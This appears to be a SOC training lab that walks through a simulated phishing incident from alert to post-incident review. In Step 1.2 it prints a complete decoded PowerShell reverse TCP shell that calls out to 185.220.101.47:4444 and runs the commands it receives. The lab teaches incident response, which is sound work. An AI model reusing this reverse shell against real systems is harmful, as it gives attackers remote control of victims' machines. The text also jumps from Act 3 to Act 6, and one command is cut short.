# Demo 01: Complete Incident Lifecycle — Phishing Incident Walkthrough

**Duration:** ~45 minutes

**Level:** Beginner → Intermediate

**Environment:** Docker (self-contained simulation)

---

## Overview

This demo walks through every phase of the incident lifecycle using a realistic phishing incident scenario.
A simulated environment generates log data representing a complete attack chain from initial email delivery through containment.

You will:

* Receive a simulated phishing alert
* Triage and classify the incident
* Investigate across multiple log sources
* Contain the threat
* Document findings in an incident ticket

---

## Scenario

**Incident:** A phishing email was delivered to `jsmith@acmecorp.local`.
The email contained a malicious Word document.
The user opened the document, which executed a PowerShell payload, established a C2 connection, and began enumerating the local system.

**Your role:** SOC Tier 2 Analyst — you have received a P4 alert from the SIEM and must determine whether this is a real incident, classify its severity, and respond.

## Act 1: Detection — The Alert Arrives

### Step 1.1 — Review the initial SIEM alert

The following alert has been generated by the SIEM at **09:52 UTC**:

```text
╔══════════════════════════════════════════════════════════════╗
║  SIEM ALERT — RULE: Suspicious Office Macro Execution        ║
║  Severity: P4 (LOW)        Time: 2024-11-15 09:52 UTC        ║
║  ─────────────────────────────────────────────────────────── ║
║  Host:     WS-JSMITH (192.168.10.42)                         ║
║  User:     ACME\jsmith                                       ║
║  Process:  winword.exe → cmd.exe → powershell.exe            ║
║  Rule:     Office application spawning command shell         ║
║  Raw event: Sysmon EventID 1 - Process Create               ║
╚══════════════════════════════════════════════════════════════╝
```

**Your first decision:** Is this a false positive or a real incident?

Run the following command to see the simulated log entry:

```console
docker exec demo01-simulator cat /var/log/simulated/sysmon.log | grep "winword"
```

Expected output:

```json
{
  "EventID": 1,
  "TimeCreated": "2024-11-15T09:44:35Z",
  "Computer": "WS-JSMITH",
  "User": "ACME\\jsmith",
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdA...",
  "GrandParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdA..."
}
```

**Analysis:** `WINWORD.EXE → CMD.EXE → POWERSHELL.EXE` with `-Enc` (Base64 encoded command) and `-W Hidden` is a **strong indicator of malicious macro execution**.
This is **not** a false positive.

### Step 1.2 — Decode the PowerShell command

```console
docker exec demo01-simulator python3 /tools/decode_ps.py \
  "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAUAB..."
```

Decoded output:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('185.220.101.47', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Finding:** This is a **PowerShell reverse TCP shell** connecting to `185.220.101.47:4444`.
This is a confirmed malicious payload. **Upgrade to P2.**

## Act 2: Analysis — Scoping the Incident

### Step 2.1 — Find the phishing email

Pivot backward in time to find the delivery mechanism:

```console
docker exec demo01-simulator cat /var/log/simulated/mail.log | python3 /tools/filter_logs.py \
  --user "jsmith" \
  --before "2024-11-15T09:44:00Z" \
  --window 30m
```

Output:

```text
2024-11-15 09:42:11 UTC | MAIL01 | DELIVERED | To: jsmith@acmecorp.local
  From: accounting@acme-invoices.net
  Subject: URGENT: Invoice #INV-2024-8847 requires your approval
  Attachment: Invoice_INV-2024-8847.docm (67,234 bytes)
  SPF: FAIL (185.220.101.47 not authorized for acme-invoices.net)
  DKIM: FAIL
  DMARC: FAIL (none policy - not quarantined)
```

**Finding:** The phishing email was delivered at 09:42 from `185.220.101.47`.
SPF/DKIM/DMARC all failed but the email was delivered because DMARC policy was set to `none` (monitoring only, no enforcement).
This is a **detection gap** to note.

## Act 3: Containment

### Step 3.1 — Isolate the affected endpoints

```bash
# Simulate EDR network isolation
docker exec demo01-simulator python3 /tools/edr_action.py \
  --action isolate \
  --host WS-JSMITH \
  --reason "Confirmed malware — reverse shell to 185.220.101.47"

docker exec demo01-simulator python3 /tools/edr_action.py \
  --action isolate \
  --host WS-MWILSON \
  --reason "Same phishing campaign — potential compromise"
```

### Step 3.2 — Block malicious infrastructure

```bash
# Block at DNS level
docker exec demo01-simulator python3 /tools/block_ioc.py \
  --type dns \
  --value "acme-invoices.net" \
  --reason "Phishing sender domain"

# Block C2 at perimeter firewall
docker exec demo01-simulator python3 /tools/block_ioc.py \
  --type ip \
  --value "185.220.101.47" \
  --reason "Confirmed C2 for INC-2024-0847"

# Block attachment hash
docker exec demo01-simulator python3 /tools/block_ioc.py \
  --type hash \
```

## Act 6: Post-Incident — Lessons Learned

### Step 6.1 — Generate the incident summary

```console
docker exec demo01-simulator python3 /tools/generate_pir.py --incident INC-2024-0847
```

This generates a Post-Incident Report draft at `/evidence/INC-2024-0847/PIR-DRAFT.md`.

### Step 6.2 — Review key findings

**What happened:**

1. Attacker sent spear-phishing email from spoofed domain `acme-invoices.net`
1. Email bypassed email gateway (DMARC policy was `none` — no enforcement)
1. User `jsmith` opened the malicious `.docm` attachment
1. VBA macro executed PowerShell reverse shell to attacker C2
1. Attacker gained interactive shell on `WS-JSMITH`
1. Attacker performed initial reconnaissance (discovery phase)
1. Second user `mwilson` also clicked the link
1. Both endpoints isolated before lateral movement occurred

**Detection gap:** DMARC policy was set to `none` — attacker's spoofed email passed through without quarantine.

**Response gap:** 7-minute delay between initial execution and SIEM alert — PowerShell encoded command detection rule had 5-minute aggregation window.

**What worked:** EDR process chain detection caught the macro execution.
The `WINWORD → CMD → POWERSHELL` behavioral rule is TTP-based, not IOC-based, so it fired even on a previously unknown payload.

## Discussion Questions

1. The attacker had 7 minutes of access before detection. What changes would reduce dwell time?
1. DMARC was set to `none` — who is responsible for this gap? How would you track this as a risk?
1. The PowerShell payload was encoded (`-Enc`). What detection techniques are effective against encoding obfuscation?
1. The attack used a `.docm` file. Name three alternative delivery methods the attacker could have used that this email gateway would not catch.
1. At what point in the Cyber Kill Chain did the SOC first detect the attack? What earlier detection opportunities were missed?
